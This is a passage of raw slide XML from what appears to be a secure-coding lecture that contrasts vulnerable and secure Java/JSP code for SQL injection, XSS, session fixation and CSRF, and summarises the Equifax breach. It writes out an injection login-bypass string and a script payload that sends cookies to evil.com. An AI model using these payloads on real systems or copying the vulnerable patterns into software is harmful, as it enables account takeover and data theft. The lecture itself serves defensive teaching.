                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>✗ VULNERABLE  —  Vulnerable to Injection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="2148840"/>
            <a:ext cx="5020056" cy="3840480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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String q = "SELECT * FROM users "</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 "WHERE email='" + email</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 "' AND pass='" + pass + "'";</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Statement st = conn.createStatement();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ResultSet rs = st.executeQuery(q);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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Input: ' OR '1'='1</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Query becomes always-true —</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logs in as the first user in DB</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6080760" y="1691640"/>
            <a:ext cx="5349240" cy="4434840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1237"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E7F2EC"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="2F7D5C"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6245352" y="1783080"/>
            <a:ext cx="5020056" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2F7D5C"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>✓ SECURE  —  Parameterized Query</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6245352" y="2148840"/>
            <a:ext cx="5020056" cy="3840480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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String q = "SELECT * FROM users "</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 "WHERE email=? AND pass=?";</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PreparedStatement ps =</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conn.prepareStatement(q);</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ps.setString(1, email);</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ps.setString(2, pass);</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ResultSet rs = ps.executeQuery();</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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Input is bound as DATA, never</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parsed as part of the SQL syntax</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>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12" name="Text 10"/>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CROSS-SITE SCRIPTING</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XSS — Vulnerable vs. Secure JSP Output</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="28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250" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B2B2B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Reflecting a search term back to the page without encoding lets an attacker inject a script that runs in another user's browser.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1691640"/>
            <a:ext cx="5349240" cy="4434840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1237"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F8E9E9"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="B23A3A"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="1783080"/>
            <a:ext cx="5020056" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B23A3A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>✗ VULNERABLE  —  Reflects Raw Input</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="2148840"/>
            <a:ext cx="5020056" cy="3840480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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&lt;%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String q = request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.getParameter("q");</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%&gt;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You searched for: &lt;%= q %&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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Input: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&lt;script&gt;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document.location=</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'https://evil.com/'+</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document.cookie</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&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6080760" y="1691640"/>
            <a:ext cx="5349240" cy="4434840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1237"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E7F2EC"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="2F7D5C"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6245352" y="1783080"/>
            <a:ext cx="5020056" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2F7D5C"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>✓ SECURE  —  HTML-Encoded Output</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6245352" y="2148840"/>
            <a:ext cx="5020056" cy="3840480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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&lt;%@ taglib uri="jstl/core"</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prefix="c" %&gt;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You searched for:</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&lt;c:out value="${param.q}"/&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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&lt;c:out&gt; HTML-encodes the</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value: &lt; becomes &amp;lt; etc.</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The browser renders it as</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TEXT, never executes it</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>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12" name="Text 10"/>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A07 · AUTH FAILURES</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Session Fixation — Vulnerable vs. Secure Java</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="28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250" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B2B2B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Not regenerating the session ID at login lets an attacker pre-set a victim's session and hijack it after they log in.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1691640"/>
            <a:ext cx="5349240" cy="4434840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1237"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F8E9E9"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="B23A3A"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="1783080"/>
            <a:ext cx="5020056" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B23A3A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>✗ VULNERABLE  —  Session ID Reused</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="2148840"/>
            <a:ext cx="5020056" cy="3840480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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HttpSession session =</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request.getSession();</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Session ID is unchanged</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from before login</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session.setAttribute(</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"user", authUser);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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Attacker sends victim a link</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with a known session ID,</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then reuses it after victim</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logs in under that ID</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6080760" y="1691640"/>
            <a:ext cx="5349240" cy="4434840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1237"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E7F2EC"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="2F7D5C"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6245352" y="1783080"/>
            <a:ext cx="5020056" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2F7D5C"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>✓ SECURE  —  Session Regenerated on Login</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6245352" y="2148840"/>
            <a:ext cx="5020056" cy="3840480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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HttpSession old =</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request.getSession(false);</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if (old != null) old.invalidate();</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HttpSession session =</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request.getSession(true);</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New session ID issued</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AFTER successful login</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session.setAttribute(</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"user", authUser);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>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12" name="Text 10"/>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CROSS-SITE REQUEST FORGERY</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CSRF — Vulnerable vs. Secure Form Handling</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="28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250" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B2B2B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Cookies are sent automatically with every request (Week 2) — without a token, any site can trigger an action on the user's behalf.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1691640"/>
            <a:ext cx="5349240" cy="4434840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1237"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F8E9E9"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="B23A3A"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="1783080"/>
            <a:ext cx="5020056" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B23A3A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>✗ VULNERABLE  —  No CSRF Token</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="2148840"/>
            <a:ext cx="5020056" cy="3840480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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&lt;form action="/transfer"</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method="POST"&gt;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&lt;input name="amount"&gt;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&lt;input name="toAcct"&gt;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&lt;/form&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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A malicious site can host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an auto-submitting copy</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of this exact form — the</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browser attaches the</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victim's real session cookie</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6080760" y="1691640"/>
            <a:ext cx="5349240" cy="4434840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1237"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E7F2EC"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="2F7D5C"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6245352" y="1783080"/>
            <a:ext cx="5020056" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2F7D5C"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>✓ SECURE  —  Per-Session CSRF Token</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6245352" y="2148840"/>
            <a:ext cx="5020056" cy="3840480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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&lt;form action="/transfer"</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method="POST"&gt;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&lt;input type="hidden"</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name="csrf"</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value="${csrfToken}"&gt;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&lt;input name="amount"&gt;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&lt;input name="toAcct"&gt;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&lt;/form&gt;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Server rejects any request</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whose token doesn't match</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B1B1B"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>// the one issued to this user</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>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12" name="Text 10"/>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PRACTICAL CONTEXT · REAL INCIDENT</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Case in Point — The 2017 Equifax Breach</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1463040"/>
            <a:ext cx="10424160" cy="4389120"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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What happened — attackers exploited a known, unpatched vulnerability (CVE-2017-5638) in Apache Struts, a Java web framework — mapping directly to OWASP A06: Vulnerable and Outdated Components.</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The flaw — a crafted HTTP header let attackers execute arbitrary commands on the server; a patch had been available for over two months before the breach.</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The impact — personal data of roughly 147 million people was exposed, including Social Security numbers, birth dates, and addresses.</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The compounding failure — OWASP A09 (Logging &amp; Monitoring Failures) meant the intrusion went undetected for approximately 76 days.</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The lesson — this wasn't a novel, unstoppable attack: a known CVE, a missing patch, and inadequate monitoring — three ordinary, preventable failures compounded into one of the largest breaches on record.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5"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6"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FIGURE 4.2</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Defense in Depth — Layered Protection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1234440"/>
            <a:ext cx="11064240" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B2B2B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>No single control is perfect — layering means one failure doesn't equal one breach.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1645920" y="1828800"/>
            <a:ext cx="8869680" cy="777240"/>
